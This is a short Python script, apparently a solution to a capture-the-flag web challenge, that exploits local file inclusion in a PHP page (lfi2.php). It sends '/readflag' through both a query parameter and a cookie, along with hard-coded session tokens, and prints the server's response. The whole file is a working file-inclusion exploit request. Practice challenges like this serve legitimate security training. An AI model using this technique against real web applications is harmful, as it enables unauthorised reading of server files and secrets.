import requests

URL = 'http://2023whs.arang.kr:9201/lfi2.php'
PARAM = '?p=/readflag'

COOKIE = {
    'p' : '/readflag',
    'session' : 'eyJpc0xvZ2luIjp0cnVlLCJ1c2VyaWQiOiJxYXdzMTIzNCJ9.ZTO1NQ.NuVdyIeWfYVaMQ2R65TVLVgI66U',
    'PHPSESSID' : '6ab9dc7b290a927964096f61a1ac21c1',
    'userid' : 'qaws1234'
    }

resp = requests.get(URL + PARAM, cookies=COOKIE)

print(resp.text)